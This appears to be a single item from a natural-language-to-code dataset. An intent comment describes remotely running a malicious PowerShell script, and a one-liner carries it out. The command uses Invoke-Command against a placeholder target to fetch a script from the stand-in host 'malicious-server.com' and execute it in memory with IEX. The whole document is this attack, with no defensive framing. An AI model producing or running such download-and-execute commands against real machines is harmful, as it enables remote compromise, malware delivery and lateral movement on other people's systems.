# Natural language intent:
# Invokes a command on a remote computer to download and execute a malicious PowerShell script.

Invoke-Command -ComputerName <target> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://malicious-server.com/malicious_script.ps1')}
